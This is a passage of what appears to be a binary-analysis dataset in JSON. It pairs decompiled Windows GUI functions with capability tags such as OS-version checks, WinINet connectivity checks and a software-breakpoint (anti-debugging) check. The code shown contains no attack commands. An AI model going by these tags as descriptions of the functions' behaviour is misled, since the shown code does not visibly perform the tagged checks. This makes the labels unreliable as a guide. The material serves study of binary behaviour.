        "decompiled_code": "\nvoid __cdecl fcn.00448cfc(int32_t arg_8h)\n\n{\n    char in_AL;\n    char cVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    (**(**(arg_8h + -0xc) + 8))();\n    if (((*(arg_8h + -0x10) != 0) &&\n        (((in_AL == '\\0' || (*(*(arg_8h + -0x10) + 0x57) != '\\0')) ||\n         (((*(*(arg_8h + -0x10) + 0x1c) & 0x10) != 0 && ((*(*(arg_8h + -0x10) + 0x51) & 4) == 0)))))) &&\n       (in_AL == *(*(arg_8h + -0x10) + 0x5b))) {\n        fcn.00414d8c();\n    }\n    var_8h = fcn.00449558();\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = fcn.0044951c();\n            if (((in_AL == *(iVar2 + 0x5b)) &&\n                (((((in_AL == '\\0' || (*(iVar2 + 0x57) != '\\0')) || (*0x448e84 == (*0x448e84 & *(iVar2 + 0x50)))) ||\n                  (((*(iVar2 + 0x1c) & 0x10) != 0 && ((*(iVar2 + 0x51) & 4) == 0)))) &&\n                 ((cVar1 = fcn.004040e4(),  cVar1 == '\\0' || ((*(iVar2 + 0x1c) & 0x10) == 0)))))) &&\n               (iVar2 != *(arg_8h + -0x10))) {\n                for (iVar2 = 0; iVar2 < *(*(arg_8h + -0xc) + 8); iVar2 = iVar2 + 1) {\n                    arg_8h_00 = arg_8h;\n                    fcn.00414eec();\n                    cVar1 = fcn.00448b84(arg_8h_00);\n                    if (cVar1 != '\\0') break;\n                }\n                fcn.00414f68();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    var_8h = *(*(arg_8h + -0xc) + 8);\n    if (-1 < var_8h + -1) {\n        do {\n            iVar2 = arg_8h;\n            fcn.00414eec();\n            fcn.00448cb4(iVar2);\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 692
    },
    "00448e88": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00448e88(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00449558();\n    iVar1 = iVar1 + -1;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.0044951c();\n            if (*(iVar2 + 0x5b) != '\\0') {\n                return 1;\n            }\n            iVar2 = fcn.0044951c();\n            if (*0x448ed8 != *(iVar2 + 0x61)) {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    return 0;\n}\n",
        "token_count": 168
    },
    "00448edc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00448edc(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (((*(in_EAX + 0x77) != '\\0') && (*(in_EAX + 0x1db) != '\\0')) && (in_EAX[0x6c] != 0)) {\n        (**(*in_EAX[0x6c] + 0x2c))();\n    }\n    uStack32 = 0x448f26;\n    cVar1 = fcn.00448e88(&stack0xfffffffc);\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x90))();\n        fcn.00403f28();\n        uStack32 = 0x448fbb;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00448cfc(&stack0xfffffffc);\n        fcn.00404154();\n        *in_FS_OFFSET = uStack36;\n        uStack32 = 0x448fba;\n        fcn.00403f58();\n        return;\n    }\n    if (*(in_EAX + 0x1da) != '\\0') {\n        fcn.00404154();\n    }\n    return;\n}\n",
        "token_count": 415
    },
    "00448fe0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00448fe0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack32 = 0x448ff4;\n    cVar1 = fcn.0044d568();\n    if ((cVar1 != '\\0') && ((*(in_EAX + 7) & 8) == 0)) {\n        if (*(in_EAX + 100) == 0) {\n            puStack32 = 0x449020;\n            fcn.00449074();\n            uStack36 = 0x449067;\n            uStack40 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd8;\n            puStack32 = &stack0xfffffffc;\n            (**(*in_EAX + 0x44))();\n            (**(*in_EAX + 0x94))();\n            *in_FS_OFFSET = uStack40;\n            puStack32 = 0x44906e;\n            *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n            uStack36 = 0x449066;\n            fcn.0044907c();\n            return;\n        }\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) | 0x10;\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "0044907c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044907c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 400) = *(in_EAX + 400) + -1;\n    if ((*(in_EAX + 400) == 0) && ((*(in_EAX + 0x54) & 0x10) != 0)) {\n        fcn.0044909c();\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "00449178": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.00449178(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_5h;\n    \n    puStack32 = 0x44918f;\n    iVar1 = fcn.00449558();\n    if (iVar1 == 0) {\n        return;\n    }\n    puStack32 = 0x4491a3;\n    iVar1 = fcn.00403f28();\n    puStack32 = 0x4491ae;\n    fcn.00449074();\n    uStack36 = 0x449266;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar2 = fcn.00449558();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.0044951c();\n            if (*(iVar3 + 0x5b) - 3U < 2) {\n                fcn.0044951c();\n                fcn.00414d8c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00404154();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x44926d;\n    while (0 < *(iVar1 + 8)) {\n        uStack36 = 0x449220;\n        iVar2 = fcn.00414eec();\n        if (*(iVar2 + 0x5b) == '\\x03') {\n            uStack36 = 0x449231;\n            fcn.004448f8();\n        }\n        else {\n            uStack36 = 0x44923c;\n            fcn.004448f8();\n        }\n        uStack36 = 0x44924b;\n        fcn.00414dd8();\n    }\n    uStack36 = 0x44925d;\n    fcn.00403f58();\n    uStack36 = 0x449265;\n    fcn.0044907c();\n    return;\n}\n",
        "token_count": 500
    },
    "00449578": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449578(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00449558();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0044951c();\n            (**(iVar2 + 0x38))();\n            if (*(param_2 + 0xc) != 0) {\n                return;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "0044967c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044967c(uint param_1, uint32_t *param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.00445c8c();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x2000;\n    }\n    cVar1 = fcn.00445cbc();\n    if (cVar1 != '\\0') {\n        *param_2 = *param_2 | 0x4000;\n    }\n    cVar1 = fcn.00404154();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404154();\n        if (cVar1 == '\\0') {\n            *param_2 = *param_2 | 0x1000;\n        }\n        else {\n            cVar1 = fcn.00404154();\n            if (cVar1 == '\\x01') {\n                *param_2 = *param_2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "004496e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004496e4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x449802;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00403720();\n    *param_2 = in_EAX[0x19];\n    param_2[1] = 0x44000000;\n    fcn.0044967c();\n    if ((*(in_EAX + 0x14) & 1) != 0) {\n        param_2[1] = param_2[1] | 0x2000000;\n        param_2[2] = param_2[2] | 0x10000;\n    }\n    if ((*(in_EAX + 7) & 0x10) == 0) {\n        cVar1 = (**(*in_EAX + 0x50))();\n        if (cVar1 == '\\0') {\n            param_2[1] = param_2[1] | 0x8000000;\n        }\n    }\n    if (*(in_EAX + 0x76) != '\\0') {\n        param_2[1] = param_2[1] | 0x10000;\n    }\n    param_2[3] = in_EAX[0x10];\n    param_2[4] = in_EAX[0x11];\n    param_2[5] = in_EAX[0x12];\n    param_2[6] = in_EAX[0x13];\n    if (in_EAX[0xc] == 0) {\n        param_2[7] = in_EAX[0x71];\n    }\n    else {\n        iVar2 = fcn.0044d1c8();\n        param_2[7] = iVar2;\n    }\n    param_2[9] = 0xb;\n    param_2[10] = sub.user32.dll_DefWindowProcA;\n    uVar3 = 0;\n    iVar2 = sub.user32.dll_LoadCursorA(0, 0x7f00);\n    param_2[0xf] = iVar2;\n    param_2[0x10] = 0;\n    param_2[0xd] = *0x4957f4;\n    fcn.00403e38();\n    fcn.00405004();\n    fcn.00409610();\n    *in_FS_OFFSET = uVar3;\n    uStack288 = 0x449809;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 652
    },
    "00449810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00449810(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint *arg_ch;\n    uint uStack216;\n    uint uStack212;\n    uchar *puStack208;\n    uint var_c0h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint lpWndClass;\n    code *var_b0h;\n    uint var_8ch;\n    uint var_85h;\n    int32_t var_70h;\n    uint var_68h;\n    code *var_64h;\n    uint hInstance;\n    uint *var_44h;\n    uint lpClassName;\n    \n    puStack208 = &stack0xfffffffc;\n    uStack212 = 0x4499d1;\n    uStack216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack216;\n    (**(*in_EAX + 0x9c))();\n    if ((var_70h == 0) && ((var_85h & 0x40) != 0)) {\n        if ((in_EAX[1] != 0) && ((*(in_EAX[1] + 0x1c) & 2) != 0)) {\n            cVar1 = fcn.004040e4();\n            if (cVar1 != '\\0') {\n                var_70h = fcn.0044d1c8();\n                goto code_r0x004498bc;\n            }\n        }\n        var_bch = in_EAX[2];\n        var_b8h._0_1_ = 0xb;\n        arg_ch = &var_bch;\n        uVar5 = 0;\n        fcn.00406a50();\n        fcn.0040c5e8(uVar5, arg_ch);\n        fcn.004047cc();\n    }\ncode_r0x004498bc:\n    in_EAX[0x6a] = var_64h;\n    iVar3 = sub.user32.dll_GetClassInfoA(hInstance, &lpClassName, &lpWndClass);\n    if ((iVar3 == 0) || (var_b0h != fcn.00441e90)) {\n        if (iVar3 != 0) {\n            sub.user32.dll_UnregisterClassA(&lpClassName, hInstance);\n        }\n        var_64h = fcn.00441e90;\n        var_44h = &lpClassName;\n        iVar2 = sub.user32.dll_RegisterClassA(&var_68h);\n        if (iVar2 == 0) {\n            fcn.0040db88();\n        }\n    }\n    *0x4915dc = in_EAX;\n    (**(*in_EAX + 0xa0))();\n    if (in_EAX[0x6d] == 0) {\n        fcn.0040db88();\n    }\n    uVar4 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff0);\n    if ((uVar4 & 0x40000000) != 0) {\n        iVar3 = sub.user32.dll_GetWindowLongA(in_EAX[0x6d], 0xfffffff4);\n        if (iVar3 == 0) {\n            sub.user32.dll_SetWindowLongA(in_EAX[0x6d], 0xfffffff4, in_EAX[0x6d]);\n        }\n    }\n    fcn.004097f0();\n    in_EAX[0x19] = 0;\n    fcn.0044d574();\n    uVar5 = 1;\n    fcn.00420c58();\n    fcn.00446870(uVar5);\n    if (*(in_EAX + 0x17) != '\\0') {\n        fcn.00404154();\n    }\n    *in_FS_OFFSET = uVar5;\n    fcn.00404da0(0x4499d8);\n    return;\n}\n",
        "token_count": 902
    },
    "00449ac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00449ac0(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    if ((*(*(arg_8h + -4) + 0x20) == 0) || (cVar1 = fcn.00449aac(),  cVar1 == '\\0')) {\n        iVar3 = *(*(arg_8h + -8) + 0x1cc);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00414eec();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x449b9c != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar3 = *(*(arg_8h + -8) + 0x1d0);\n        if ((iVar3 != 0) && (iVar3 = *(iVar3 + 8),  -1 < iVar3 + -1)) {\n            do {\n                iVar2 = fcn.00414eec();\n                if ((*(iVar2 + 0x5b) == '\\0') && (*0x449b9c != *(iVar2 + 0x61))) {\n                    return 1;\n                }\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 381
    },
    "00449dc4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00449dc4(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_EAX;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    var_10h = *arg_8h;\n    uStack16 = arg_8h[1];\n    uStack12 = arg_8h[2];\n    uStack8 = arg_8h[3];\n    if (*(in_EAX + 0x232) != 0) {\n        (**(in_EAX + 0x230))(&var_10h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00449e58": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00449e58(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    if (in_EAX[0x6d] != 0) {\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                piVar1 = fcn.00414eec();\n                (**(*piVar1 + 0xb0))();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iStack20 = in_EAX[0x6d];\n        uStack16 = (*(in_EAX + 0x55) & 0x20) != 0;\n        sub.user32.dll_EnumChildWindows(iStack20, fcn.00449e14, &iStack20);\n        (**(*in_EAX + 0xb8))();\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00449ecc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00449ecc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        fcn.00446870(0);\n    }\n    return;\n}\n",
        "token_count": 55
    },
    "00449f70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00449f70(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    if ((((*(in_EAX + 0x57) == '\\0') || (((*(in_EAX + 7) & 0x10) != 0 && ((*(in_EAX + 0x55) & 8) != 0)))) &&\n        (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 0x55) & 8) != 0 || ((*(in_EAX + 0x51) & 4) != 0)))))) ||\n       (((*(in_EAX + 0x15) & 8) != 0 || ((*(in_EAX + 7) & 8) != 0)))) {\n        cVar1 = '\\0';\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    if (cVar1 != '\\0') {\n        if (in_EAX[0x6d] == 0) {\n            puStack28 = 0x449fea;\n            (**(*in_EAX + 0x98))();\n        }\n        if ((in_EAX[0x74] != 0) && (iVar2 = *(in_EAX[0x74] + 8),  -1 < iVar2 + -1)) {\n            do {\n                puStack28 = 0x44a012;\n                fcn.00414eec();\n                puStack28 = 0x44a017;\n                fcn.00449f70();\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    if ((in_EAX[0x6d] != 0) && (*(in_EAX + 0x1da) != cVar1)) {\n        *(in_EAX + 0x1da) = cVar1;\n        uStack32 = 0x44a06c;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        uVar3 = 0;\n        puStack28 = &stack0xfffffffc;\n        fcn.00446870(0);\n        *in_FS_OFFSET = uVar3;\n    }\n    return;\n}\n",
        "token_count": 550
    },
    "0044a094": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044a094(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = in_EAX;\n    while (iVar1 = *(iVar3 + 0x30),  iVar1 != 0) {\n        iVar3 = iVar1;\n        if (*(iVar1 + 0x1da) == '\\0') {\n            return;\n        }\n    }\n    if ((*(in_EAX + 0x1c) & 8) != 0) {\n        return;\n    }\n    cVar2 = fcn.004040e4();\n    if ((cVar2 == '\\0') && (*(iVar3 + 0x1c4) == 0)) {\n        return;\n    }\n    fcn.00449f70();\n    return;\n}\n",
        "token_count": 189
    },
    "0044a0d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a0d8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint var_4h;\n    \n    if ((in_EAX[0xc] == 0) && (param_2 != in_EAX[0x71])) {\n        if ((in_EAX[0x6d] == 0) || ((in_EAX[0x71] == 0 || (param_2 == 0)))) {\n            fcn.0044e6dc();\n            uVar1 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe8;\n            (**(*in_EAX + 0xb0))();\n            in_EAX[0x71] = param_2;\n            fcn.0044a094();\n            *in_FS_OFFSET = uVar1;\n            fcn.0044e6dc();\n            return;\n        }\n        in_EAX[0x71] = param_2;\n        sub.user32.dll_SetParent();\n        if ((4 < **0x4929cc) && (**0x492cfc == 2)) {\n            fcn.00446870(0);\n        }\n        fcn.0044a094();\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "0044a234": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044a234(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    uint lprc;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00413a6c();\n    *(arg_8h + -0xc) = var_ch;\n    *(arg_8h + -8) = var_8h;\n    (**(*in_EAX + 0x44))(*(arg_8h + -0xc), *(arg_8h + -8));\n    iVar2 = sub.user32.dll_PtInRect(&lprc);\n    if (iVar2 == 0) {\n        bVar3 = false;\n    }\n    else if (((*(in_EAX + 7) & 0x10) == 0) || ((*(in_EAX + 0x57) == '\\0' && ((*(in_EAX + 0x51) & 4) != 0)))) {\n        if (*(in_EAX + 0x57) != '\\0') {\n            cVar1 = (**(*in_EAX + 0x50))();\n            if ((cVar1 != '\\0') || (*(arg_8h + -0xd) != '\\0')) {\n                var_4h = CONCAT22(*(arg_8h + -8), *(arg_8h + -0xc));\n                iVar2 = fcn.00446870(var_4h);\n                bVar3 = iVar2 != 0;\n                goto code_r0x0044a2f0;\n            }\n        }\n        bVar3 = false;\n    }\n    else {\n        bVar3 = true;\n    }\ncode_r0x0044a2f0:\n    if (bVar3) {\n        *(arg_8h + -0x14) = in_EAX;\n    }\n    return;\n}\n",
        "token_count": 434
    },
    "0044a300": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044a300(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uchar *puVar3;\n    uint arg_8h_00;\n    int32_t var_14h;\n    uint var_dh;\n    uint var_4h;\n    \n    var_14h = 0;\n    if (((arg_ch != '\\0') && (*(in_EAX + 0x1d0) != 0)) && (iVar2 = *(*(in_EAX + 0x1d0) + 8) + -1,  -1 < iVar2)) {\n        do {\n            if (arg_8h != '\\0') {\n                arg_ch_00 = 1;\n                arg_8h_00 = 1;\n                fcn.00414eec();\n                var_14h = fcn.0044a300(arg_8h_00, arg_ch_00);\n            }\n            if (var_14h == 0) {\n                puVar3 = &stack0xfffffffc;\n                fcn.00414eec();\n                cVar1 = fcn.0044a234(puVar3);\n                if (cVar1 != '\\0') break;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (((*(in_EAX + 0x1cc) != 0) && (var_14h == 0)) && (iVar2 = *(*(in_EAX + 0x1cc) + 8) + -1,  -1 < iVar2)) {\n        do {\n            puVar3 = &stack0xfffffffc;\n            fcn.00414eec();\n            cVar1 = fcn.0044a234(puVar3);\n            if (cVar1 != '\\0') {\n                return 0;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return var_14h;\n}\n",
        "token_count": 462
    },
    "0044a510": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044a510(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar1 = fcn.0044d1c8();\n    iVar2 = sub.user32.dll_GetCapture();\n    if (iVar1 == iVar2) {\n        if ((*0x49169c == 0) || (iVar1 = *0x49169c,  in_EAX != *(*0x49169c + 0x30))) {\n            iVar1 = 0;\n        }\n    }\n    else {\n        iVar1 = fcn.0044a300(0, 0);\n    }\n    if (iVar1 != 0) {\n        uVar3 = fcn.00446870(*(param_2 + 8) - *(iVar1 + 0x40) & 0xffffU | *(param_2 + 10) - *(iVar1 + 0x44) << 0x10);\n        *(param_2 + 0xc) = uVar3;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 258
    },
    "0044a5c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a5c4(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    int32_t iStack72;\n    uint uVar6;\n    uint arg_ch;\n    uint var_34h;\n    uint lpEventTrack;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *param_2;\n    if (iVar4 < 0x100) {\n        if (0x1f < iVar4) {\n            if (iVar4 == 0x21) {\n                cVar1 = fcn.0044a3c4();\n                if (cVar1 != '\\0') {\n                    if (param_2[3] != 0) {\n                        return;\n                    }\n                    cVar1 = fcn.0044d568();\n                    if (cVar1 == '\\0') {\n                        return;\n                    }\n                    fcn.0044694c();\n                    return;\n                }\n            }\n            else if (iVar4 == 0x84) {\n                fcn.0044694c();\n                if (param_2[3] != -1) {\n                    return;\n                }\n                arg_ch = 0;\n                uVar6 = 0;\n                iStack72 = 0x44a72a;\n                fcn.004450dc();\n                iStack72 = 0x44a737;\n                iVar4 = fcn.0044a300(uVar6, arg_ch);\n                if (iVar4 == 0) {\n                    return;\n                }\n                param_2[3] = 1;\n                return;\n            }\n            goto code_r0x0044aa2a;\n        }\n        if (iVar4 == 0x1f) {\n            iVar4 = fcn.0044d1c8();\n            iVar5 = sub.user32.dll_GetCapture();\n            if (((iVar4 == iVar5) && (*0x49169c != 0)) && 